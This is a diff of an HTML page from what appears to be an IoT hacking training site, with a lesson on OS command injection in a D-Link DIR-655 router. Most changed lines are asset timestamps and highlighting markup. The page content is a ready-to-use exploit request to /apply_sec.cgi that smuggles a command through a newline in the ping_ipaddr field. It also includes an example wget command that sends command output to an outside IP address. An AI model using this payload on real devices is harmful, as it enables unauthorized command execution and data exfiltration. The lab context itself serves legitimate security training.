@@ -6,18 +6,18 @@
 <meta name=description content>
 <link rel=icon href=/images/favicon.png type=image/png>
 <title>OS Command Injection :: IoT Hack Labs</title>
-<link href=/css/nucleus.css?1634659240 rel=stylesheet>
-<link href=/css/fontawesome-all.min.css?1634659240 rel=stylesheet>
-<link href=/css/hybrid.css?1634659240 rel=stylesheet>
-<link href=/css/featherlight.min.css?1634659240 rel=stylesheet>
-<link href=/css/perfect-scrollbar.min.css?1634659240 rel=stylesheet>
-<link href=/css/auto-complete.css?1634659240 rel=stylesheet>
-<link href=/css/atom-one-dark-reasonable.css?1634659240 rel=stylesheet>
-<link href=/css/theme.css?1634659240 rel=stylesheet>
-<link href=/css/tabs.css?1634659240 rel=stylesheet>
-<link href=/css/hugo-theme.css?1634659240 rel=stylesheet>
-<link href=/css/theme-red.css?1634659240 rel=stylesheet>
-<script src=/js/jquery-3.3.1.min.js?1634659240></script>
+<link href=/css/nucleus.css?1634659970 rel=stylesheet>
+<link href=/css/fontawesome-all.min.css?1634659970 rel=stylesheet>
+<link href=/css/hybrid.css?1634659970 rel=stylesheet>
+<link href=/css/featherlight.min.css?1634659970 rel=stylesheet>
+<link href=/css/perfect-scrollbar.min.css?1634659970 rel=stylesheet>
+<link href=/css/auto-complete.css?1634659970 rel=stylesheet>
+<link href=/css/atom-one-dark-reasonable.css?1634659970 rel=stylesheet>
+<link href=/css/theme.css?1634659970 rel=stylesheet>
+<link href=/css/tabs.css?1634659970 rel=stylesheet>
+<link href=/css/hugo-theme.css?1634659970 rel=stylesheet>
+<link href=/css/theme-red.css?1634659970 rel=stylesheet>
+<script src=/js/jquery-3.3.1.min.js?1634659970></script>
 <style>:root #header+#content>#left>#rlblock_left{display:none!important}</style>
 </head>
 <body data-url=/router-lab/dir-655/os-command-injection/>
@@ -30,10 +30,10 @@
 <input data-search-input id=search-by type=search placeholder=Search...>
 <span data-search-clear><i class="fas fa-times"></i></span>
 </div>
-<script type=text/javascript src=/js/lunr.min.js?1634659240></script>
-<script type=text/javascript src=/js/auto-complete.js?1634659240></script>
+<script type=text/javascript src=/js/lunr.min.js?1634659970></script>
+<script type=text/javascript src=/js/auto-complete.js?1634659970></script>
 <script type=text/javascript>var baseurl="https://iot-hack-labs.github.io/"</script>
-<script type=text/javascript src=/js/search.js?1634659240></script>
+<script type=text/javascript src=/js/search.js?1634659970></script>
 </div>
 <section id=homelinks>
 <ul>
@@ -263,21 +263,21 @@ OS Command Injection
 </h1>
 <h2 id=os-command-injection>OS Command Injection</h2>
 <p>Make an HTTP POST request to the router, replacing &ldquo;{URL_ENCODED_CMD}&rdquo; with the desired command to run on the router like <code>wget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)</code></p>
-<pre tabindex=0><code>POST /apply_sec.cgi HTTP/1.1
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>POST /apply_sec.cgi HTTP/1.1
 Host: 192.168.232.128
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Macintosh; Intel Mac OS X 10.14; rv:69.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,*/*;q<span style=color:#f92672>=</span>0.8
+Accept-Language: vi-VN,vi;q<span style=color:#f92672>=</span>0.8,en-US;q<span style=color:#f92672>=</span>0.5,en;q<span style=color:#f92672>=</span>0.3
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 131
+Content-Length: <span style=color:#ae81ff>131</span>
 Connection: close
 Referer: http://192.168.232.128/login_pic.asp
-Cookie: uid=1234123
-Upgrade-Insecure-Requests: 1
-html_response_page=login_pic.asp&amp;action=ping_test&amp;ping_ipaddr=127.0.0.1%0a{URL_ENCODED_CMD}
+Cookie: uid<span style=color:#f92672>=</span><span style=color:#ae81ff>1234123</span>
+Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
+html_response_page<span style=color:#f92672>=</span>login_pic.asp&amp;action<span style=color:#f92672>=</span>ping_test&amp;ping_ipaddr<span style=color:#f92672>=</span>127.0.0.1%0a<span style=color:#f92672>{</span>URL_ENCODED_CMD<span style=color:#f92672>}</span>
 
-</code></pre>
+</code></pre></div>
 <footer class=footline>
 </footer>
 </div>
@@ -290,17 +290,17 @@ html_response_page=login_pic.asp&amp;action=ping_test&amp;ping_ipaddr=127.0.0.1%
 <div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px>
 <div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div>
 </div>
-<script src=/js/clipboard.min.js?1634659240></script>
-<script src=/js/perfect-scrollbar.min.js?1634659240></script>
-<script src=/js/perfect-scrollbar.jquery.min.js?1634659240></script>
-<script src=/js/jquery.sticky.js?1634659240></script>
-<script src=/js/featherlight.min.js?1634659240></script>
-<script src=/js/highlight.pack.js?1634659240></script>
+<script src=/js/clipboard.min.js?1634659970></script>
+<script src=/js/perfect-scrollbar.min.js?1634659970></script>
+<script src=/js/perfect-scrollbar.jquery.min.js?1634659970></script>
+<script src=/js/jquery.sticky.js?1634659970></script>
+<script src=/js/featherlight.min.js?1634659970></script>
+<script src=/js/highlight.pack.js?1634659970></script>
 <script>hljs.initHighlightingOnLoad()</script>
-<script src=/js/modernizr.custom-3.6.0.js?1634659240></script>
-<script src=/js/learn.js?1634659240></script>
-<script src=/js/hugo-learn.js?1634659240></script>
-<script src=/mermaid/mermaid.js?1634659240></script>
+<script src=/js/modernizr.custom-3.6.0.js?1634659970></script>
+<script src=/js/learn.js?1634659970></script>
+<script src=/js/hugo-learn.js?1634659970></script>
+<script src=/mermaid/mermaid.js?1634659970></script>
 <script>mermaid.initialize({startOnLoad:!0})</script>
 </body>
 </html>
